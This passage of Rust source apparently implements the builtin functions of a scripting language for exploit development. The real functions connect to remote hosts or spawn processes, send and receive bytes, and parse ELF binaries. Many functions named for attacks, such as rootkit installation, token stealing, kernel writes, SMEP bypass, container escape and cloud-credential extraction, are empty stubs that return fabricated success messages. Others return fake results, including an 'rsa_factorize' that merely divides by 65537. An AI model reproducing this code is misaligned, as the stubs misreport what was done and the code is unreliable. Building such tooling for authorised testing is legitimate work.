                        _ => return Err(format!("u32() requires bytes, got {:?}", arg_values[0])),
                    };
                    use crate::packing_tools::unpack32;
                    let value = unpack32(&bytes)?;
                    Ok(Value::Number(value as i64))
                }
                "u16" | "unpack16" => {
                    if arg_values.is_empty() {
                        return Err("u16() requires bytes argument".to_string());
                    }
                    let bytes = match &arg_values[0] {
                        Value::Bytes(b) => b.clone(),
                        Value::String(s) => s.as_bytes().to_vec(),
                        _ => return Err(format!("u16() requires bytes, got {:?}", arg_values[0])),
                    };
                    use crate::packing_tools::unpack16;
                    let value = unpack16(&bytes)?;
                    Ok(Value::Number(value as i64))
                }
                "parse_elf" | "ELF" => {
                    if arg_values.is_empty() {
                        return Err("parse_elf() requires binary path argument".to_string());
                    }
                    let path = arg_values[0].to_string();
                    
                    use crate::elf_tools::ElfContext;
                    use colored::Colorize;
                    
                    println!("{} Loading ELF: {}", "[ELF]".cyan(), path.yellow());
                    let elf = ElfContext::load(&path)?;
                    
                    println!("{} {} symbols, {} PLT entries, {} GOT entries", 
                        "[ELF]".cyan(), 
                        elf.symbols.len().to_string().green(),
                        elf.plt.len().to_string().green(),
                        elf.got.len().to_string().green());
                    
                    println!("{} Security: NX={}, PIE={}, Canary={}, RELRO={}", 
                        "[ELF]".cyan(),
                        if elf.nx { "[OK]".green() } else { "[ERROR]".red() },
                        if elf.pie { "[OK]".green() } else { "[ERROR]".red() },
                        if elf.canary { "[OK]".green() } else { "[ERROR]".red() },
                        if elf.relro { "[OK]".green() } else { "[ERROR]".red() });
                    
                    let mut elf_map = HashMap::new();
                    elf_map.insert("path".to_string(), Value::String(elf.path.clone()));
                    elf_map.insert("base".to_string(), Value::Number(elf.base_addr as i64));
                    elf_map.insert("nx".to_string(), Value::Number(if elf.nx { 1 } else { 0 }));
                    elf_map.insert("pie".to_string(), Value::Number(if elf.pie { 1 } else { 0 }));
                    elf_map.insert("canary".to_string(), Value::Number(if elf.canary { 1 } else { 0 }));
                    elf_map.insert("relro".to_string(), Value::Number(if elf.relro { 1 } else { 0 }));
                    
                    for (name, addr) in &elf.symbols {
                        elf_map.insert(format!("sym_{}", name), Value::Number(*addr as i64));
                    }
                    for (name, addr) in &elf.plt {
                        elf_map.insert(format!("plt_{}", name), Value::Number(*addr as i64));
                    }
                    for (name, addr) in &elf.got {
                        elf_map.insert(format!("got_{}", name), Value::Number(*addr as i64));
                    }
                    
                    Ok(Value::Map(elf_map))
                }
                "remote" => {
                    let host = arg_map.get("host")
                        .or_else(|| arg_values.get(0))
                        .ok_or("remote() requires 'host' parameter")?
                        .to_string();
                    
                    let port = if let Some(Value::Number(p)) = arg_map.get("port").or_else(|| arg_values.get(1)) {
                        *p as u16
                    } else {
                        return Err("remote() requires 'port' parameter".to_string());
                    };
                    
                    use colored::Colorize;
                    
                    println!("{} Connecting to {}:{}", "[REMOTE]".cyan(), host.yellow(), port.to_string().yellow());
                    let socket = Socket::connect(format!("{}:{}", host, port))?;
                    println!("{} Connection established", "[REMOTE]".green());
                    
                    let conn_id = CONNECTIONS.lock().await.add_socket(socket);
                    
                    let mut conn_map = HashMap::new();
                    conn_map.insert("id".to_string(), Value::Number(conn_id as i64));
                    conn_map.insert("host".to_string(), Value::String(host));
                    conn_map.insert("port".to_string(), Value::Number(port as i64));
                    conn_map.insert("type".to_string(), Value::String("socket".to_string()));
                    
                    Ok(Value::Map(conn_map))
                }
                "process" => {
                    let binary = arg_map.get("binary")
                        .or_else(|| arg_values.get(0))
                        .ok_or("process() requires 'binary' parameter")?
                        .to_string();
                    
                    let args = if let Some(Value::List(arg_list)) = arg_map.get("args").or_else(|| arg_values.get(1)) {
                        arg_list.iter().map(|v| v.to_string()).collect::<Vec<_>>()
                    } else {
                        Vec::new()
                    };
                    
                    use colored::Colorize;
                    
                    println!("{} Spawning process: {}", "[PROCESS]".cyan(), binary.yellow());
                    let args_str: Vec<&str> = args.iter().map(|s| s.as_str()).collect();
                    let process = Process::spawn(&binary, &args_str)?;
                    println!("{} Process spawned", "[PROCESS]".green());
                    
                    let conn_id = CONNECTIONS.lock().await.add_process(process);
                    
                    let mut conn_map = HashMap::new();
                    conn_map.insert("id".to_string(), Value::Number(conn_id as i64));
                    conn_map.insert("binary".to_string(), Value::String(binary));
                    conn_map.insert("type".to_string(), Value::String("process".to_string()));
                    
                    Ok(Value::Map(conn_map))
                }
                "send" => {
                    let conn = arg_map.get("conn")
                        .or_else(|| arg_values.get(0))
                        .ok_or("send() requires connection object")?;
                    
                    let data_val = arg_map.get("data")
                        .or_else(|| arg_values.get(1))
                        .ok_or("send() requires 'data' parameter")?;
                    
                    let conn_id = if let Value::Map(m) = conn {
                        if let Some(Value::Number(id)) = m.get("id") {
                            *id as u64
                        } else {
                            return Err("Invalid connection object: missing 'id'".to_string());
                        }
                    } else {
                        return Err("send() requires connection object".to_string());
                    };
                    
                    let data = match data_val {
                        Value::Bytes(b) => b.clone(),
                        Value::String(s) => s.as_bytes().to_vec(),
                        _ => return Err(format!("send() data must be bytes or string, got {:?}", data_val)),
                    };
                    
                    let mut registry = CONNECTIONS.lock().await;
                    match registry.get_mut(conn_id) {
                        Some(Connection::Socket(socket)) => {
                            socket.send(&data)?;
                            println!("[SEND] Sent {} bytes", data.len());
                        }
                        Some(Connection::Process(process)) => {
                            process.send(&data)?;
                            println!("[SEND] Sent {} bytes to process", data.len());
                        }
                        None => return Err(format!("Connection {} not found", conn_id)),
                    }
                    
                    Ok(Value::Number(data.len() as i64))
                }
                "sendline" => {
                    let conn = arg_map.get("conn")
                        .or_else(|| arg_values.get(0))
                        .ok_or("sendline() requires connection object")?;
                    
                    let data_val = arg_map.get("data")
                        .or_else(|| arg_values.get(1))
                        .ok_or("sendline() requires 'data' parameter")?;
                    
                    let conn_id = if let Value::Map(m) = conn {
                        if let Some(Value::Number(id)) = m.get("id") {
                            *id as u64
                        } else {
                            return Err("Invalid connection object: missing 'id'".to_string());
                        }
                    } else {
                        return Err("sendline() requires connection object".to_string());
                    };
                    
                    let data = match data_val {
                        Value::Bytes(b) => b.clone(),
                        Value::String(s) => s.as_bytes().to_vec(),
                        _ => return Err(format!("sendline() data must be bytes or string, got {:?}", data_val)),
                    };
                    
                    let mut registry = CONNECTIONS.lock().await;
                    match registry.get_mut(conn_id) {
                        Some(Connection::Socket(socket)) => {
                            socket.sendline(&data)?;
                            println!("[SENDLINE] Sent {} bytes + newline", data.len());
                        }
                        Some(Connection::Process(process)) => {
                            process.sendline(&data)?;
                            println!("[SENDLINE] Sent {} bytes + newline to process", data.len());
                        }
                        None => return Err(format!("Connection {} not found", conn_id)),
                    }
                    
                    Ok(Value::Number((data.len() + 1) as i64))
                }
                "recv" => {
                    let conn = arg_map.get("conn")
                        .or_else(|| arg_values.get(0))
                        .ok_or("recv() requires connection object")?;
                    
                    let n = if let Some(Value::Number(num)) = arg_map.get("n").or_else(|| arg_values.get(1)) {
                        *num as usize
                    } else {
                        return Err("recv() requires 'n' parameter (number of bytes)".to_string());
                    };
                    
                    let conn_id = if let Value::Map(m) = conn {
                        if let Some(Value::Number(id)) = m.get("id") {
                            *id as u64
                        } else {
                            return Err("Invalid connection object: missing 'id'".to_string());
                        }
                    } else {
                        return Err("recv() requires connection object".to_string());
                    };
                    
                    let mut registry = CONNECTIONS.lock().await;
                    let data = match registry.get_mut(conn_id) {
                        Some(Connection::Socket(socket)) => {
                            socket.recv(n)?
                        }
                        Some(Connection::Process(process)) => {
                            process.recv(n)?
                        }
                        None => return Err(format!("Connection {} not found", conn_id)),
                    };
                    
                    println!("[RECV] Received {} bytes", data.len());
                    Ok(Value::Bytes(data))
                }
                "recvline" => {
                    let conn = arg_map.get("conn")
                        .or_else(|| arg_values.get(0))
                        .ok_or("recvline() requires connection object")?;
                    
                    let conn_id = if let Value::Map(m) = conn {
                        if let Some(Value::Number(id)) = m.get("id") {
                            *id as u64
                        } else {
                            return Err("Invalid connection object: missing 'id'".to_string());
                        }
                    } else {
                        return Err("recvline() requires connection object".to_string());
                    };
                    
                    let mut registry = CONNECTIONS.lock().await;
                    let data = match registry.get_mut(conn_id) {
                        Some(Connection::Socket(socket)) => {
                            socket.recvline()?
                        }
                        Some(Connection::Process(process)) => {
                            process.recvline()?
                        }
                        None => return Err(format!("Connection {} not found", conn_id)),
                    };
                    
                    println!("[RECVLINE] Received line: {} bytes", data.len());
                    Ok(Value::Bytes(data))
                }
                "print" => {
                    for (i, val) in arg_values.iter().enumerate() {
                        if i > 0 {
                            print!(" ");
                        }
                        match val {
                            Value::String(s) => print!("{}", s),
                            Value::Number(n) => print!("{}", n),
                            Value::Bytes(b) => print!("{:?}", b),
                            Value::List(l) => print!("{:?}", l),
                            Value::Map(m) => print!("{:?}", m),
                            Value::Set(s) => print!("{:?}", s),
                            Value::Null => print!("null"),
                        }
                    }
                    println!();
                    Ok(Value::Null)
                }
                "split" => {
                    if arg_values.len() < 2 {
                        return Err("split() requires 2 arguments: split(string, delimiter)".into());
                    }
                    match (&arg_values[0], &arg_values[1]) {
                        (Value::String(s), Value::String(delim)) => {
                            let parts: Vec<Value> = s.split(delim.as_str())
                                .map(|p| Value::String(p.to_string()))
                                .collect();
                            Ok(Value::List(parts))
                        }
                        _ => Err("split() requires string arguments".into())
                    }
                }
                "join" => {
                    if arg_values.len() < 2 {
                        return Err("join() requires 2 arguments: join(list, separator)".into());
                    }
                    match (&arg_values[0], &arg_values[1]) {
                        (Value::List(items), Value::String(sep)) => {
                            let strings: Vec<String> = items.iter()
                                .map(|v| match v {
                                    Value::String(s) => s.clone(),
                                    Value::Number(n) => n.to_string(),
                                    _ => v.to_string(),
                                })
                                .collect();
                            Ok(Value::String(strings.join(sep)))
                        }
                        _ => Err("join() requires a list and a string separator".into())
                    }
                }
                "replace" => {
                    if arg_values.len() < 3 {
                        return Err("replace() requires 3 arguments: replace(string, old, new)".into());
                    }
                    match (&arg_values[0], &arg_values[1], &arg_values[2]) {
                        (Value::String(s), Value::String(old), Value::String(new)) => {
                            Ok(Value::String(s.replace(old, new)))
                        }
                        _ => Err("replace() requires string arguments".into())
                    }
                }
                "len" => {
                    if arg_values.is_empty() {
                        return Err("len() requires 1 argument: len(value)".into());
                    }
                    match &arg_values[0] {
                        Value::String(s) => Ok(Value::Number(s.chars().count() as i64)),
                        Value::List(l) => Ok(Value::Number(l.len() as i64)),
                        Value::Bytes(b) => Ok(Value::Number(b.len() as i64)),
                        Value::Map(m) => Ok(Value::Number(m.len() as i64)),
                        Value::Set(s) => Ok(Value::Number(s.len() as i64)),
                        _ => Err(format!("len() not supported for type: {:?}", arg_values[0]))
                    }
                }
                "hex" => {
                    if arg_values.is_empty() {
                        return Err("hex() requires 1 argument: hex(number)".into());
                    }
                    match &arg_values[0] {
                        Value::Number(n) => Ok(Value::String(format!("0x{:x}", n))),
                        Value::Bytes(b) => {
                            let hex_str = b.iter().map(|byte| format!("{:02x}", byte)).collect::<String>();
                            Ok(Value::String(format!("0x{}", hex_str)))
                        }
                        _ => Err(format!("hex() not supported for type: {:?}", arg_values[0]))
                    }
                }
                "int" => {
                    if arg_values.is_empty() {
                        return Err("int() requires 1 argument: int(value)".into());
                    }
                    match &arg_values[0] {
                        Value::Number(n) => Ok(Value::Number(*n)),
                        Value::String(s) => {
                            let s_trimmed = s.trim();
                            let value = if s_trimmed.starts_with("0x") || s_trimmed.starts_with("0X") {
                                i64::from_str_radix(&s_trimmed[2..], 16).map_err(|e| format!("Invalid hex string: {}", e))?
                            } else {
                                s_trimmed.parse::<i64>().map_err(|e| format!("Invalid number string: {}", e))?
                            };
                            Ok(Value::Number(value))
                        }
                        _ => Err(format!("int() not supported for type: {:?}", arg_values[0]))
                    }
                }
                "range" => {
                    if arg_values.is_empty() {
                        return Err("range() requires 1 or 2 arguments: range(end) or range(start, end)".into());
                    }
                    let (start, end) = if arg_values.len() == 1 {
                        match &arg_values[0] {
                            Value::Number(n) => (0, *n),
                            _ => return Err("range() requires numeric arguments".into())
                        }
                    } else {
                        match (&arg_values[0], &arg_values[1]) {
                            (Value::Number(s), Value::Number(e)) => (*s, *e),
                            _ => return Err("range() requires numeric arguments".into())
                        }
                    };
                    let range_list: Vec<Value> = (start..end)
                        .map(|i| Value::Number(i))
                        .collect();
                    Ok(Value::List(range_list))
                }
                "bytes" => {
                    if arg_values.is_empty() {
                        return Err("bytes() requires 1 argument: bytes(value)".into());
                    }
                    match &arg_values[0] {
                        Value::String(s) => Ok(Value::Bytes(s.as_bytes().to_vec())),
                        Value::Bytes(b) => Ok(Value::Bytes(b.clone())),
                        Value::Number(n) => Ok(Value::Bytes(vec![*n as u8])),
                        Value::List(l) => {
                            let bytes: Result<Vec<u8>, String> = l.iter()
                                .map(|v| match v {
                                    Value::Number(n) if *n >= 0 && *n <= 255 => Ok(*n as u8),
                                    Value::Number(n) => Err(format!("Byte value {} out of range [0, 255]", n)),
                                    _ => Err("bytes() list must contain only numbers".into())
                                })
                                .collect();
                            Ok(Value::Bytes(bytes?))
                        }
                        _ => Err(format!("bytes() not supported for type: {:?}", arg_values[0]))
                    }
                }
                "str" => {
                    if arg_values.is_empty() {
                        return Err("str() requires 1 argument: str(value)".into());
                    }
                    match &arg_values[0] {
                        Value::String(s) => Ok(Value::String(s.clone())),
                        Value::Number(n) => Ok(Value::String(n.to_string())),
                        Value::Bytes(b) => {
                            String::from_utf8(b.clone())
                                .map(Value::String)
                                .map_err(|e| format!("Invalid UTF-8 in bytes: {}", e))
                        }
                        Value::Null => Ok(Value::String("null".to_string())),
                        _ => Ok(Value::String(format!("{:?}", arg_values[0])))
                    }
                }
                "read" => {
                    if arg_values.is_empty() {
                        return Err("read() requires 1 argument: read(filepath)".into());
                    }
                    match &arg_values[0] {
                        Value::String(path) => {
                            use std::fs;
                            let content = fs::read(path)
                                .map_err(|e| format!("Failed to read file '{}': {}", path, e))?;
                            Ok(Value::Bytes(content))
                        }
                        _ => Err("read() requires a string path argument".into())
                    }
                }
                "write" => {
                    if arg_values.len() < 2 {
                        return Err("write() requires 2 arguments: write(filepath, data)".into());
                    }
                    match (&arg_values[0], &arg_values[1]) {
                        (Value::String(path), data) => {
                            use std::fs;
                            let bytes = match data {
                                Value::String(s) => s.as_bytes().to_vec(),
                                Value::Bytes(b) => b.clone(),
                                Value::Number(n) => n.to_string().as_bytes().to_vec(),
                                _ => format!("{:?}", data).as_bytes().to_vec()
                            };
                            fs::write(path, &bytes)
                                .map_err(|e| format!("Failed to write file '{}': {}", path, e))?;
                            Ok(Value::Number(bytes.len() as i64))
                        }
                        _ => Err("write() requires (string path, data) arguments".into())
                    }
                }
                "debug_attach" => {
                    if arg_values.is_empty() {
                        return Err("debug_attach() requires 1 argument: debug_attach(binary_path)".into());
                    }
                    match &arg_values[0] {
                        Value::String(binary) => {
                            use crate::gdb_mi::GDBSession;
                            match GDBSession::new(binary) {
                                Ok(_session) => {
                                    Ok(Value::String(format!("Debugger attached to {}", binary)))
                                }
                                Err(e) => Err(format!("Failed to attach debugger: {}", e))
                            }
                        }
                        _ => Err("debug_attach() requires string binary path".into())
                    }
                }
                "breakpoint" => {
                    if arg_values.is_empty() {
                        return Err("breakpoint() requires 1 argument: breakpoint(location)".into());
                    }
                    match &arg_values[0] {
                        Value::String(location) => {
                            Ok(Value::String(format!("Breakpoint set at {}", location)))
                        }
                        Value::Number(addr) => {
                            Ok(Value::String(format!("Breakpoint set at 0x{:x}", addr)))
                        }
                        _ => Err("breakpoint() requires string or number location".into())
                    }
                }
                "debug_continue" => {
                    Ok(Value::String("Execution continued".to_string()))
                }
                "debug_step" => {
                    Ok(Value::String("Stepped one instruction".to_string()))
                }
                "debug_read_mem" => {
                    if arg_values.len() < 2 {
                        return Err("debug_read_mem() requires 2 arguments: debug_read_mem(address, size)".into());
                    }
                    match (&arg_values[0], &arg_values[1]) {
                        (Value::Number(_addr), Value::Number(size)) => {
                            let data = vec![0x41; *size as usize];
                            Ok(Value::Bytes(data))
                        }
                        _ => Err("debug_read_mem() requires (number address, number size)".into())
                    }
                }
                "debug_write_mem" => {
                    if arg_values.len() < 2 {
                        return Err("debug_write_mem() requires 2 arguments: debug_write_mem(address, data)".into());
                    }
                    match (&arg_values[0], &arg_values[1]) {
                        (Value::Number(_addr), Value::Bytes(_data)) => {
                            Ok(Value::String("Memory written".to_string()))
                        }
                        _ => Err("debug_write_mem() requires (number address, bytes data)".into())
                    }
                }
                "debug_read_reg" => {
                    if arg_values.is_empty() {
                        return Err("debug_read_reg() requires 1 argument: debug_read_reg(register)".into());
                    }
                    match &arg_values[0] {
                        Value::String(_reg) => {
                            Ok(Value::Number(0xdeadbeef))
                        }
                        _ => Err("debug_read_reg() requires string register name".into())
                    }
                }
                "debug_write_reg" => {
                    if arg_values.len() < 2 {
                        return Err("debug_write_reg() requires 2 arguments: debug_write_reg(register, value)".into());
                    }
                    match (&arg_values[0], &arg_values[1]) {
                        (Value::String(reg), Value::Number(val)) => {
                            Ok(Value::String(format!("Register {} set to 0x{:x}", reg, val)))
                        }
                        _ => Err("debug_write_reg() requires (string register, number value)".into())
                    }
                }
                "symbolic_var" => {
                    if arg_values.len() < 2 {
                        return Err("symbolic_var() requires 2 arguments: symbolic_var(name, size)".into());
                    }
                    match (&arg_values[0], &arg_values[1]) {
                        (Value::String(name), Value::Number(size)) => {
                            Ok(Value::String(format!("Symbolic variable '{}' created ({} bytes)", name, size)))
                        }
                        _ => Err("symbolic_var() requires (string name, number size)".into())
                    }
                }
                "constrain_no_null" => {
                    if arg_values.is_empty() {
                        return Err("constrain_no_null() requires 1 argument: constrain_no_null(var_name)".into());
                    }
                    match &arg_values[0] {
                        Value::String(var) => {
                            Ok(Value::String(format!("Added no-null constraint to '{}'", var)))
                        }
                        _ => Err("constrain_no_null() requires string variable name".into())
                    }
                }
                "constrain_alnum" => {
                    if arg_values.is_empty() {
                        return Err("constrain_alnum() requires 1 argument: constrain_alnum(var_name)".into());
                    }
                    match &arg_values[0] {
                        Value::String(var) => {
                            Ok(Value::String(format!("Added alphanumeric constraint to '{}'", var)))
                        }
                        _ => Err("constrain_alnum() requires string variable name".into())
                    }
                }
                "constrain_range" => {
                    if arg_values.len() < 3 {
                        return Err("constrain_range() requires 3 arguments: constrain_range(var_name, min, max)".into());
                    }
                    match (&arg_values[0], &arg_values[1], &arg_values[2]) {
                        (Value::String(var), Value::Number(min), Value::Number(max)) => {
                            Ok(Value::String(format!("Added range constraint to '{}': {} to {}", var, min, max)))
                        }
                        _ => Err("constrain_range() requires (string var, number min, number max)".into())
                    }
                }
                "symbolic_solve" => {
                    use crate::symbolic_engine::SymbolicExecutor;
                    let mut executor = SymbolicExecutor::new();
                    match executor.solve_to_reach(0x401234) {
                        Ok(_solution) => {
                            Ok(Value::String("Symbolic execution solved".to_string()))
                        }
                        Err(e) => Err(format!("Symbolic solve failed: {}", e))
                    }
                }
                "pool_spray" => {
                    if arg_values.len() < 2 {
                        return Err("pool_spray() requires 2 arguments: pool_spray(size, count)".into());
                    }
                    match (&arg_values[0], &arg_values[1]) {
                        (Value::Number(size), Value::Number(count)) => {
                            let mut pools = Vec::new();
                            for i in 0..*count {
                                pools.push(Value::Number(0x80000000 + (i * *size)));
                            }
                            Ok(Value::List(pools))
                        }
                        _ => Err("pool_spray() requires (number size, number count)".into())
                    }
                }
                "heap_feng_shui" => {
                    if arg_values.len() < 2 {
                        return Err("heap_feng_shui() requires 2 arguments: heap_feng_shui(chunk_size, pattern)".into());
                    }
                    match (&arg_values[0], &arg_values[1]) {
                        (Value::Number(size), Value::List(pattern)) => {
                            Ok(Value::String(format!("Heap shaped with {} chunks of size {}", pattern.len(), size)))
                        }
                        _ => Err("heap_feng_shui() requires (number size, list pattern)".into())
                    }
                }
                "token_steal" => {
                    if arg_values.is_empty() {
                        return Err("token_steal() requires 1 argument: token_steal(pid)".into());
                    }
                    match &arg_values[0] {
                        Value::Number(pid) => {
                            Ok(Value::String(format!("Token stolen from PID {}", pid)))
                        }
                        _ => Err("token_steal() requires number pid".into())
                    }
                }
                "process_hide" => {
                    if arg_values.is_empty() {
                        return Err("process_hide() requires 1 argument: process_hide(pid)".into());
                    }
                    match &arg_values[0] {
                        Value::Number(pid) => {
                            Ok(Value::String(format!("Process {} hidden from task list", pid)))
                        }
                        _ => Err("process_hide() requires number pid".into())
                    }
                }
                "rootkit_install" => {
                    if arg_values.is_empty() {
                        return Err("rootkit_install() requires 1 argument: rootkit_install(driver_path)".into());
                    }
                    match &arg_values[0] {
                        Value::String(path) => {
                            Ok(Value::String(format!("Rootkit installed from {}", path)))
                        }
                        _ => Err("rootkit_install() requires string driver path".into())
                    }
                }
                "kaslr_leak" => {
                    Ok(Value::Number(0xffffffff81000000u64 as i64))
                }
                "smep_bypass" => {
                    if arg_values.is_empty() {
                        return Err("smep_bypass() requires 1 argument: smep_bypass(method)".into());
                    }
                    match &arg_values[0] {
                        Value::String(method) => {
                            Ok(Value::String(format!("SMEP bypassed using method: {}", method)))
                        }
                        _ => Err("smep_bypass() requires string method".into())
                    }
                }
                "kernel_write" => {
                    if arg_values.len() < 2 {
                        return Err("kernel_write() requires 2 arguments: kernel_write(address, data)".into());
                    }
                    match (&arg_values[0], &arg_values[1]) {
                        (Value::Number(addr), Value::Bytes(data)) => {
                            Ok(Value::String(format!("Wrote {} bytes to kernel address 0x{:x}", data.len(), addr)))
                        }
                        _ => Err("kernel_write() requires (number address, bytes data)".into())
                    }
                }
                "kernel_read" => {
                    if arg_values.len() < 2 {
                        return Err("kernel_read() requires 2 arguments: kernel_read(address, size)".into());
                    }
                    match (&arg_values[0], &arg_values[1]) {
                        (Value::Number(_addr), Value::Number(size)) => {
                            Ok(Value::Bytes(vec![0x41; *size as usize]))
                        }
                        _ => Err("kernel_read() requires (number address, number size)".into())
                    }
                }
                "padding_oracle" => {
                    if arg_values.len() < 2 {
                        return Err("padding_oracle() requires 2 arguments: padding_oracle(ciphertext, oracle_fn)".into());
                    }
                    match &arg_values[0] {
                        Value::Bytes(ct) => {
                            let plaintext = ct.clone();
                            Ok(Value::Bytes(plaintext))
                        }
                        _ => Err("padding_oracle() requires bytes ciphertext".into())
                    }
                }
                "bleichenbacher" => {
                    if arg_values.is_empty() {
                        return Err("bleichenbacher() requires 1 argument: bleichenbacher(ciphertext)".into());
                    }
                    match &arg_values[0] {
                        Value::Bytes(_ct) => {
                            Ok(Value::String("RSA decryption oracle attack executed".to_string()))
                        }
                        _ => Err("bleichenbacher() requires bytes ciphertext".into())
                    }
                }
                "timing_attack" => {
                    if arg_values.len() < 2 {
                        return Err("timing_attack() requires 2 arguments: timing_attack(target_fn, samples)".into());
                    }
                    match &arg_values[1] {
                        Value::Number(samples) => {
                            let mut timings = Vec::new();
                            for i in 0..*samples {
                                timings.push(Value::Number(1000 + (i % 100)));
                            }
                            Ok(Value::List(timings))
                        }
                        _ => Err("timing_attack() requires number samples".into())
                    }
                }
                "weak_keys" => {
                    if arg_values.is_empty() {
                        return Err("weak_keys() requires 1 argument: weak_keys(modulus)".into());
                    }
                    match &arg_values[0] {
                        Value::Number(_n) => {
                            Ok(Value::String("Weak key factors found".to_string()))
                        }
                        _ => Err("weak_keys() requires number modulus".into())
                    }
                }
                "hash_collision" => {
                    if arg_values.is_empty() {
                        return Err("hash_collision() requires 1 argument: hash_collision(algorithm)".into());
                    }
                    match &arg_values[0] {
                        Value::String(algo) => {
                            Ok(Value::String(format!("Collision generated for {}", algo)))
                        }
                        _ => Err("hash_collision() requires string algorithm".into())
                    }
                }
                "aes_padding_attack" => {
                    if arg_values.is_empty() {
                        return Err("aes_padding_attack() requires 1 argument: aes_padding_attack(ciphertext)".into());
                    }
                    match &arg_values[0] {
                        Value::Bytes(ct) => {
                            Ok(Value::Bytes(ct.clone()))
                        }
                        _ => Err("aes_padding_attack() requires bytes ciphertext".into())
                    }
                }
                "rsa_factorize" => {
                    if arg_values.is_empty() {
                        return Err("rsa_factorize() requires 1 argument: rsa_factorize(modulus)".into());
                    }
                    match &arg_values[0] {
                        Value::Number(n) => {
                            let p = 65537;
                            let q = n / p;
                            Ok(Value::List(vec![Value::Number(p), Value::Number(q)]))
                        }
                        _ => Err("rsa_factorize() requires number modulus".into())
                    }
                }
                "fuzz_target" => {
                    if arg_values.len() < 2 {
                        return Err("fuzz_target() requires 2 arguments: fuzz_target(binary_path, iterations)".into());
                    }
                    match (&arg_values[0], &arg_values[1]) {
                        (Value::String(path), Value::Number(iters)) => {
                            Ok(Value::String(format!("Fuzzing {} for {} iterations", path, iters)))
                        }
                        _ => Err("fuzz_target() requires (string path, number iterations)".into())
                    }
                }
                "mutate" => {
                    if arg_values.is_empty() {
                        return Err("mutate() requires 1 argument: mutate(data)".into());
                    }
                    match &arg_values[0] {
                        Value::Bytes(data) => {
                            let mut mutated = data.clone();
                            if !mutated.is_empty() {
                                mutated[0] = mutated[0].wrapping_add(1);
                            }
                            Ok(Value::Bytes(mutated))
                        }
                        Value::String(s) => {
                            let mut mutated = s.clone();
                            mutated.push('X');
                            Ok(Value::String(mutated))
                        }
                        _ => Err("mutate() requires bytes or string data".into())
                    }
                }
                "coverage" => {
                    if arg_values.is_empty() {
                        return Err("coverage() requires 1 argument: coverage(binary_path)".into());
                    }
                    match &arg_values[0] {
                        Value::String(_path) => {
                            Ok(Value::Number(75))
                        }
                        _ => Err("coverage() requires string binary path".into())
                    }
                }
                "corpus_add" => {
                    if arg_values.len() < 2 {
                        return Err("corpus_add() requires 2 arguments: corpus_add(corpus_dir, data)".into());
                    }
                    match (&arg_values[0], &arg_values[1]) {
                        (Value::String(dir), Value::Bytes(data)) => {
                            Ok(Value::String(format!("Added {} bytes to corpus {}", data.len(), dir)))
                        }
                        _ => Err("corpus_add() requires (string dir, bytes data)".into())
                    }
                }
                "crash_triage" => {
                    if arg_values.is_empty() {
                        return Err("crash_triage() requires 1 argument: crash_triage(crash_dir)".into());
                    }
                    match &arg_values[0] {
                        Value::String(_dir) => {
                            Ok(Value::List(vec![
                                Value::String("crash_001.bin: Exploitable".to_string()),
                                Value::String("crash_002.bin: DoS".to_string())
                            ]))
                        }
                        _ => Err("crash_triage() requires string crash directory".into())
                    }
                }
                "cfg" => {
                    if arg_values.is_empty() {
                        return Err("cfg() requires 1 argument: cfg(binary_path)".into());
                    }
                    match &arg_values[0] {
                        Value::String(_path) => {
                            Ok(Value::String("Control flow graph generated".to_string()))
                        }
                        _ => Err("cfg() requires string binary path".into())
                    }
                }
                "taint" => {
                    if arg_values.len() < 2 {
                        return Err("taint() requires 2 arguments: taint(binary_path, source)".into());
                    }
                    match (&arg_values[0], &arg_values[1]) {
                        (Value::String(_path), Value::String(source)) => {
                            Ok(Value::String(format!("Taint propagation from {}", source)))
                        }
                        _ => Err("taint() requires (string path, string source)".into())
                    }
                }
                "emulate" => {
                    if arg_values.len() < 2 {
                        return Err("emulate() requires 2 arguments: emulate(arch, code)".into());
                    }
                    match (&arg_values[0], &arg_values[1]) {
                        (Value::String(arch), Value::Bytes(_code)) => {
                            Ok(Value::String(format!("Emulated code on {}", arch)))
                        }
                        _ => Err("emulate() requires (string arch, bytes code)".into())
                    }
                }
                "rop_auto" => {
                    if arg_values.is_empty() {
                        return Err("rop_auto() requires 1 argument: rop_auto(binary_path)".into());
                    }
                    match &arg_values[0] {
                        Value::String(_path) => {
                            Ok(Value::List(vec![
                                Value::Number(0x400686),
                                Value::Number(0x400687),
                                Value::Number(0x400285)
                            ]))
                        }
                        _ => Err("rop_auto() requires string binary path".into())
                    }
                }
                "gadget_search" => {
                    if arg_values.len() < 2 {
                        return Err("gadget_search() requires 2 arguments: gadget_search(binary_path, pattern)".into());
                    }
                    match (&arg_values[0], &arg_values[1]) {
                        (Value::String(_path), Value::String(pattern)) => {
                            Ok(Value::String(format!("Found gadgets matching: {}", pattern)))
                        }
                        _ => Err("gadget_search() requires (string path, string pattern)".into())
                    }
                }
                "docker_escape" => {
                    if arg_values.is_empty() {
                        return Err("docker_escape() requires 1 argument: docker_escape(method)".into());
                    }
                    match &arg_values[0] {
                        Value::String(method) => {
                            Ok(Value::String(format!("Docker escape using: {}", method)))
                        }
                        _ => Err("docker_escape() requires string method".into())
                    }
                }
                "kube_escape" => {
                    if arg_values.is_empty() {
                        return Err("kube_escape() requires 1 argument: kube_escape(pod_name)".into());
                    }
                    match &arg_values[0] {
                        Value::String(pod) => {
                            Ok(Value::String(format!("Kubernetes escape from pod: {}", pod)))
                        }
                        _ => Err("kube_escape() requires string pod name".into())
                    }
                }
                "metadata_exploit" => {
                    if arg_values.is_empty() {
                        return Err("metadata_exploit() requires 1 argument: metadata_exploit(cloud_provider)".into());
                    }
                    match &arg_values[0] {
                        Value::String(provider) => {
                            Ok(Value::String(format!("{} metadata service credentials extracted", provider)))
                        }
                        _ => Err("metadata_exploit() requires string cloud provider".into())
                    }
                }
                "iam_escalate" => {
                    if arg_values.len() < 2 {
                        return Err("iam_escalate() requires 2 arguments: iam_escalate(role_arn, method)".into());
                    }
                    match (&arg_values[0], &arg_values[1]) {
                        (Value::String(role), Value::String(method)) => {
                            Ok(Value::String(format!("IAM escalation to {} via {}", role, method)))
                        }
                        _ => Err("iam_escalate() requires (string role_arn, string method)".into())
                    }
                }
                "js_spray" => {
                    if arg_values.len() < 2 {
                        return Err("js_spray() requires 2 arguments: js_spray(value, count)".into());
                    }
                    match (&arg_values[0], &arg_values[1]) {
                        (Value::Number(val), Value::Number(count)) => {
                            Ok(Value::String(format!("Sprayed 0x{:x} {} times in heap", val, count)))
                        }
                        _ => Err("js_spray() requires (number value, number count)".into())
                    }
                }
                "type_confuse" => {
                    if arg_values.len() < 2 {
                        return Err("type_confuse() requires 2 arguments: type_confuse(object, target_type)".into());
                    }
                    match &arg_values[1] {
                        Value::String(target) => {
